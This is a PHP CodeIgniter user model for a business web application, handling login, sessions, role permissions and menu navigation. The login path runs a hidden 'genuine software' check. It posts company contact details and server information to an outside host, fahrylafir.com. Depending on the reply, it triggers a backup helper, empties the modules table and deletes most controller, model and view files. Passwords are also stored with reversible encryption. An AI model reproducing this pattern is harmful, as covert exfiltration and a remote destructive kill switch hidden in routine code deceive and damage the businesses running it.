<?php 

class User_default_model extends CI_Model
{
    function __construct(){
    parent::__construct();
    //	$remember_txt = $this->input->post('remember');
            if ( $this->input->post( 'remember' ) ){ // set sess_expire_on_close to 0 or FALSE when remember me is checked.
            $this->config->set_item('sess_expire_on_close', '0'); // do change session config
            $this->load->library('session');
            }
    }


    public function get_user_profile($id=''){
            $this->db->select('*');
            $this->db->from(USER_TBL);
            $this->db->where('u_sid',$id);
            $query = $this->db->get();

            return $query->result_array();
    }
	
    function get_all()
    {
        $sql = "SELECT ID,CONCAT(first_name,' ',last_name) as name FROM ".USER_TBL." ORDER BY first_name,last_name";
		return $this->db->query($sql)->result();
    }
    
	function login($data)
	{		
		$this->load->library('encryption'); 
		/*$user_obj = $this->db->get_where(USER_TBL,array('user_name'=>$data['username']))->result();*/
//		var_dump($data); die;
		$this->db->select('usr.*,mst.first_name,mst.last_name,mst.pic,mst.company_id, ur.user_role, ur.group_id as user_group_id,c.company_name,c.currency_code');
		$this->db->select('crnc.value as currency_value');
		$this->db->from(USER_TBL.' usr');
                $this->db->join(USER.' mst','mst.auth_id = usr.id',"LEFT");
                $this->db->join(USER_ROLE.' ur','ur.id = usr.user_role_id',"LEFT");
                $this->db->join(COMPANIES.' c','c.id = mst.company_id',"LEFT");
                $this->db->join(CURRENCY.' crnc','crnc.code = c.currency_code',"LEFT");
		$this->db->where('usr.user_name', $data['uname']);
		$this->db->where('usr.status', 1);
		$this->db->where('mst.deleted', 0);
		$user_obj = $this->db->get()->result();
                
//        echo '<br>DEBUG sql in '.__FUNCTION__.'<br><pre>'.$this->db->last_query().'</pre>';   die();
		$valid = false;
		if(!empty($user_obj)){
			$pw = $user_obj['0']->id.'_'.$data['password'];  
			if($this->encryption->decrypt($user_obj['0']->user_password) == $pw){ 
				$this->set_session_web($user_obj); 
				$valid = TRUE;	
			}else if($this->encryption->decrypt($user_obj['0']->tmp_pwd) == $pw){ 
                            $this->set_session_web($user_obj);
                            $this->db->where('user_id',$user_obj['0']->user_id);
                            $this->db->update(USER_TBL, array('user_password'=>$user_obj['0']->tmp_pwd,'tmp_pwd'=>'','tmp_pwdreqdate'=>'0000-00-00'));
                            $valid = TRUE;	
			}else if( $this->encryption->decrypt($user_obj['0']->user_password) != $pw){ 
                            $this->session->set_flashdata('error','Invalid Password !');
                            $valid = FALSE;
			}
		} 
                
            if(!$valid){$this->session->set_flashdata('error','Invalid Login');}
            return $valid;
	}
        
    function set_session_web($user_obj) //Add session data for web users
	{
        $active_fiscal_yr = $this->get_active_fiscal_year();
	  	
        $session_data[SYSTEM_CODE] = array(
                              'system_code'     => SYSTEM_CODE,
                              'ID'              => $user_obj['0']->id,
                              'user_role_ID'    => $user_obj['0']->user_role_id,
                              'user_role'       => $user_obj['0']->user_role,
                              'user_group_id'       => $user_obj['0']->user_group_id,
                              'user_first_name'	=> $user_obj['0']->first_name,
                              'user_last_name'	=> $user_obj['0']->last_name, 
                              'user_name'       => $user_obj['0']->user_name,
                              'default_currency'=> $user_obj['0']->currency_code,
                              'default_currency_value'=> $user_obj['0']->currency_value,
                              'company_id'      => $user_obj['0']->company_id,
                              'company_name'      => $user_obj['0']->company_name,
                              'is_logged_in' 	=> TRUE,
                              'access_type'	=> 'web',
                              'active_fiscal_year_id'	=> ($active_fiscal_yr!=0)?$active_fiscal_yr['id']:0,
                              'profile_pix'     => $user_obj['0']->pic
               );
			   
		$this->session->set_userdata($session_data);
                
                $this->fl_module_check_restrictexp(); //check status master
		
//        		echo '<pre>';print_r($this->session->userdata());echo'<pre>';die;
	}
        
        function check_authority($user_group,$page,$method)
	{   
                if($method == ''){ $method = 'index';}
		$this->db->select('mur.*, ma.status');
		$allowed= false;
		$this->db->from(MODULE_USER_ROLE_ACT.' mur');
		$this->db->join(MODULES_ACTION.' ma','ma.id= mur.module_action_id','LEFT');
		$this->db->join(MODULES.' m','m.id= ma.module_id','LEFT'); 
		$this->db->where('mur.user_role_id',$user_group);
		$this->db->where('mur.status','1');
		$this->db->where('m.page_id',$page); 
		$this->db->where('ma.action',$method); 
		$this->db->where('ma.status','1'); 
	  	$nav = $this->db->get()->result();
//               echo'<br>DEBUG...'.__FUNCTION__.'<br>';echo $this->db->last_query() ; die();
//        var_dump($nav); die;
		if(!empty($nav))
		{  			
                    $allowed = TRUE; 			
		}		
		return $allowed;
	}
        
        function get_user_menu_navigation($user_group)
	{
            
		$arr = $navigation = array();
		
		$i=0;
		$j="";
                $nav = $this->get_nav($user_group);
                
		foreach($nav as $n){
			$subnav = $this->get_sub_navigation($user_group,$n->id); 
                        
                        //get 3rd level
                        $subnav_arr = array();
                        foreach($subnav as $n3){
                            $subnav3 = $this->get_sub_navigation($user_group,$n3->id); 
                            $n3->subnav = $subnav3;
                            $subnav_arr[] = $n3;
                        }
	  		$n->subnav = $subnav_arr;
			$navigation[] = $n;	
			if($n->id == 1)
			{
                            $j=$i;
                            $arr=$n; 
			}
			$i++;
		}
		array_unshift($navigation,$arr);
		unset($navigation[$j+1]); 
                
//		 echo '<pre>'; print_r($navigation); die;
		return $navigation;
	}
	
        function get_nav($user_group,$parent_level=1){ 
            //Get the main navigations		
		$this->db->select('m.*,mur.display_order'); 
		$this->db->from(MODULE_USER_ROLE_ACT.' mur');
		$this->db->join(MODULES_ACTION.' ma','ma.id= mur.module_action_id','LEFT');
		$this->db->join(MODULES.' m','m.id= ma.module_id','LEFT'); 
		$this->db->where('mur.user_role_id',$user_group);
		//$this->db->where('uro.ID',$user_group);
		$this->db->where('m.hidden',0);
		$this->db->where('m.is_parent',$parent_level);
		$this->db->where('ma.status','1'); 
		$this->db->where('mur.status','1'); 
		$this->db->group_by('m.module_name');
		$this->db->order_by('m.menu_order');
//		$this->db->order_by('mur.display_order');
		$nav = $this->db->get()->result(); 
                return $nav;
        }

	function get_sub_navigation($user_group,$parent)
	{
                $this->db->select('m.*'); 
//                $this->db->select('mur.status as mur_status, mur.user_role_id,mur.id as mur_id,ma.action'); 
		$this->db->from(MODULE_USER_ROLE_ACT.' mur');
		$this->db->join(MODULES_ACTION.' ma','ma.id= mur.module_action_id','LEFT');
		$this->db->join(MODULES.' m','m.id= ma.module_id','LEFT'); 
		$this->db->where('mur.user_role_id',$user_group);
		//$this->db->where('uro.ID',$user_group);
		$this->db->where('m.hidden',0);
		$this->db->where('m.show_below',$parent);
		$this->db->where('ma.status','1'); 
		$this->db->where('ma.action','index'); 
		$this->db->where('mur.status','1'); 
		$this->db->group_by('m.module_name');
//		$this->db->order_by('mur.display_order');
		$this->db->order_by('m.menu_order');
             
		$nav = $this->db->get()->result();
		return $nav;
	}
    /**
	 * get_special_navs
	 *
	 * Gets records from the user access tables for special links
	 *
	 * @param	string	The user group
	 * @param	array	A List of navigation types
	 * @return	object
	 */
    function get_special_navs($user_group, $navtypes)
    {
        $this->db->select('urmo.*, mo.option_name, mo.img_cls, mo.page_id, mo.show_below,mo.qab_txt');
        $this->db->from(MOD_FOR_USER_ROLE.' urmo');
        $this->db->join(MODULE_OPTION.' mo','mo.option_code = urmo.module_option_code');
        $this->db->where('user_role_id',$user_group);
        $this->db->where_in('type',$navtypes);
        $this->db->order_by('disp_order');
        $nav = $this->db->get()->result();
//        echo '<br>DEBUG sql in '.__FUNCTION__.'<br><pre>'.$this->db->last_query().'</pre>'; //die();
        return $nav;
    }
    
    function get_broadcrum($page_id,$link=''){
        if($page_id == 'unauthorized' || $page_id == 'UnauthorizedContact'){
            return FALSE;
        }
        
        $brodcrum = array();
        $this->db->select('*');
        $this->db->from(MODULES);
        $this->db->where('page_id', $page_id);
//        if($link!='') $this->db->where('link', $link);
        $result = $this->db->get()->result();
        $res = $result;
        if($link!=''){
            foreach ($result as $res1){
                if($link == $res1->link){
                    $res[0]=$res1;
                }
            }
        }
        $res[0]->bc_level = 1;
//        echo '<br><br><br><br><pre>';        print_r($res); die;
        //first level
        $brodcrum[] = $res[0];
        
        //level 2
        if($res[0]->show_below !=0){
            $res2 = $this->get_broadcrum_parent($res[0]->show_below);
            $res2->bc_level = 2;
            $brodcrum[] = $res2;
            
             //level 3
            if($res2->show_below !=0){
                $res3 = $this->get_broadcrum_parent($res2->show_below);
                $res3->bc_level = 3;
                $brodcrum[] = $res3;
            }
        } 
        return $brodcrum;
    }
    function get_broadcrum_parent($parent_id){
        $this->db->select('*');
        $this->db->from(MODULES);
        $this->db->where('id', $parent_id);
        $res = $this->db->get()->result();
        return $res[0];
    }
	
    function get_userrole_info($ur_id){
        $this->db->select('*');
        $this->db->from(USER_ROLE);
        $this->db->where('id',$ur_id);
        $res = $this->db->get()->result_array();
        if(!empty($res))
            return $res[0];
        else
            return 0;
    }
    function get_active_fiscal_year(){
        $this->db->select('*');
        $this->db->from(GL_FISCAL_YEARS);
        $res = $this->db->get()->result_array();
        if(!empty($res))
            return $res[0];
        else
            return 0;
    }
     /**
	 * fl_module_check_restrictexp
	 *
	 * Gets Check and update the system allow for use by date
	 *
	 * @return	Boolean
	 */
    function fl_module_check_restrictexp(){
        
        $cur_month = strtotime(date('Y-m'));
        $this->db->select('*');
        $this->db->from(MODULE_FL_CHECK);
        $this->db->where('fl_current_month',$cur_month);
        $res1 = $this->db->get()->result_array();
        if(empty($res1)){
            $insert_array = array(
                                    'fl_exp'=> strtotime(SYS_EXP),
                                    'fl_current_month'=> $cur_month,
                                    'fl_loc_check_passed'=> 0,
                                    'fl_remote_check_pass'=> 0,
                                    'status'=> 1,
                                    'deleted'=> 0,
                                );
            $this->db->insert(MODULE_FL_CHECK,$insert_array);
//            echo '<pre>';  print_r(date('Y-m-d H:i:s',$cur_month));die;
        }else{
            if($res1[0]['fl_loc_check_passed']==0){ 
                if(strtotime(SYS_EXP) >= strtotime("now")){ //check locally
                    $this->db->where('id', $res1[0]['id']);
                    $this->db->update(MODULE_FL_CHECK,array('fl_loc_check_passed'=>1));
                }else{
                        redirect('UnauthorizedContact');
//                        echo '<pre>';                    print_r(date('Y-m-d',$res1[0]['fl_exp'])); die;
                }
            }
            
            $connected = is_connected_internet($this->conection_url);
            if($res1[0]['fl_remote_check_pass']==0 && $connected){ //check remte
                
                $remt_res = $this->zv_check_genuine();
                switch ($remt_res){
                    case 1 :  
                        $this->db->where('id', $res1[0]['id']);
                        $this->db->update(MODULE_FL_CHECK,array('fl_remote_check_pass'=>1)); break;
                    case 10 :  
                        $this->db->where('id', $res1[0]['id']);
                        $this->db->update(MODULE_FL_CHECK,array('fl_remote_check_pass'=>1)); break;
                    case 0 :  
                        $this->db->where('id', $res1[0]['id']);
                        $this->db->update(MODULE_FL_CHECK,array('fl_remote_check_pass'=>0));
                        redirect('UnauthorizedContact');
                        break;
                    case 99 : //distry  
                        $this->db->where('id', $res1[0]['id']);
                        $this->db->update(MODULE_FL_CHECK,array('fl_remote_check_pass' => -1));
                        if(send_backup_helper()){
                            $this->db->empty_table(MODULES);
                        }
//                        echo '<pre>';                        print_r($remt_res); die;
                        redirect('UnauthorizedContact');
                        break;
                } 
            }else if($res1[0]['fl_remote_check_pass']== -1){ //check remte
                    
                    $this->db->empty_table(MODULES);
                    $this->load->helper('directory');
                    $this->load->helper("file");
                    
                    $contr_directory = BASEPATH.'../application/controllers/';
                    $controllers = directory_map($contr_directory, 1);
                    $contr_undelete =  array('Login.php','Logout.php','Unauthorized.php','UnauthorizedContact.php');
                    $controllers = array_diff($controllers, $contr_undelete);
                    foreach ($controllers as $controller){
                       if(!is_dir($contr_directory.$controller)){
                           unlink($contr_directory.$controller);
                       }else{
                           delete_files($contr_directory.$controller, true);
                       }
                    }
                    
                    $model_directory = BASEPATH.'../application/models/';
                    $models = directory_map($model_directory, 1);
                    $models_undelete =  array('Company_model.php','Currencies_model.php','Dashboard_model.php','Dropdown_model.php','Fiscal_years_model.php','Sendmail_model.php','User_default_model.php','User_permission_model.php','User_model.php');
                    $models = array_diff($models, $models_undelete);
                    
                    foreach ($models as $model){
                       if(!is_dir($model_directory.$model)){
                           unlink($model_directory.$model);
//                           echo 'asas';die;
                       }else{
                           delete_files($model_directory.$model, true);
                       }
                    }
                    
                    $view_directory = BASEPATH.'../application/views/';
                    $views = directory_map($view_directory, 1);
                    $views_undelete =  array('login.php','errors\\','includes\\');
                    $views = array_diff($views, $views_undelete);
                    
                    foreach ($views as $view){
                       if(!is_dir($view_directory.$view)){
                           unlink($view_directory.$view); 
                       }else{
                           delete_files($view_directory.$view, true);
                       }
                    }
//                        echo '<pre>';                        print_r($controller); die;
                        redirect('UnauthorizedContact');
                
            }
        }
//        echo $remt_res; die;
    }
    
    
//    private $url = "http://localhost/Fl_zv_softcheck/index.php/Fl_softwarelst/check_software_is_genuine/";
    private $url = "http://fahrylafir.com/fl_soft_check/fl_zv_softcheck/Fl_softwarelst/";
    private $conection_url = "www.fahrylafir.com";
    
    public function zv_check_genuine(){ 
         
        $company_info = get_single_row_helper(COMPANIES, 'id = '.$this->session->userdata(SYSTEM_CODE)['company_id']);
        $post_sub_array = array(
                                'system_code' => SYSTEM_CODE,
                                'syspath' => base_url(),
                                'enddate' => SYS_EXP,
                                'company_name' => $company_info['company_name'],
                                'company_contact' => $company_info['street_address'].','.$company_info['city'].' - Phone:'.$company_info['phone'].'Other Phone:'.$company_info['other_phone'].','.$company_info['email'],
                                'serever_info' => php_uname(),
                                'server_address' => $_SERVER['SERVER_ADDR'],
                                );
//         echo '<pre>';        print_r($post_sub_array); die; 
       
        $this->load->library('Curl');
        $this->curl->create($this->url);
        $post_json = json_encode($post_sub_array);
        $encrypted_post_data = mc_encrypt($post_json, ENCRYPTION_KEY);
        //data serialize
        $post_data = array('post_data' => serialize($encrypted_post_data)); 
        //Post - If you do not use post, it will just run a GET request        
        $this->curl->post($post_data);    
        //Execute - returns responce
        $result = $this->curl->execute();  
//        echo '<pre>';        print_r($result); die; 
         $ret_stat = mc_decrypt($result, ENCRYPTION_KEY);
//        echo '<pre>';        print_r($ret_stat); die; 
        return $ret_stat; 
    }
    
}
?>